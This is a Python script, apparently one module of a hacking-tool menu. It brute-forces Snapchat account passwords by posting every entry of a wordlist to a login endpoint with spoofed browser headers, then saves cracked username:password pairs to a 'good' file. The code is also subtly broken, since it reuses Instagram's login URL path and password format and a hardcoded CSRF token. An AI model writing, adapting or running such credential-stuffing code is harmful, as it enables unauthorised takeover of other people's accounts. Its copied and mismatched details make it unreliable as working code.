import os
import requests
from datetime import datetime

normal_color = "\33[00m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
end_banner_color = "\33[00m"

login_url = 'https://www.snapchat.com/accounts/login/ajax/'

def read_passwords(file_path):
    """Read passwords from the given file and return them as a list."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"Error reading password file: {e}")
        return []

def get_csrf_token(session):
    return 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'

def attempt_login(session, username, password, csrf_token):
    """Attempt to log in with the given username and password."""
    timestamp = int(datetime.now().timestamp())
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.snapchat.com/accounts/login/",
        "x-csrftoken": csrf_token
    }

    try:
        response = session.post(login_url, data=payload, headers=headers)
        return response
    except Exception as e:
        print(f"Error during login attempt: {e}")
        return None

def main():
    print('')
    username = input(end_banner_color + "Username => ")
    passwords_file = "Settings/pass/pass.txt"
    passwords = read_passwords(passwords_file)
    
    with requests.Session() as session:
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            print("CSRF token not found in cookies")
            return
        
        for password in passwords:
            response = attempt_login(session, username, password, csrf_token)
            if response and ('checkpoint_url' in response.text or 'userId' in response.text):
                print((red_color + ' --> Username: ' + green_color + username + red_color + ' --> Password: ' + green_color + password + ' --> Successful login'))
                try:
                    file_path = os.path.join('Settings', 'good', 'snapchat_good.txt')
                    os.makedirs(os.path.dirname(file_path), exist_ok=True) 
                    with open(file_path, 'a') as success_file:
                        success_file.write(username + ':' + password + '\n')
                except Exception as e:
                    print(f"Error writing to snapchat_good.txt: {e}")
                break 

            if response and 'error' in response.text:
                print((normal_color + ' --> Username: ' + username + red_color + ' --> Password: ' + password + ' --> Sorry, there was a problem'))
            elif response and 'status' in response.text:
                print((red_color + ' --> Username: ' + username + red_color + ' --> Password: ' + password + ' --> Error occurred'))
            else:
                print((red_color + ' --> Username: ' + username + red_color + ' --> Password: ' + password + ' --> Login failed'))
                
    print("Finished attempting logins.")

if __name__ == "__main__":
    main()
    input("[x] Appuyer sur entrée pour retourner au menu principal.")
    os.system('python ../../main.py')
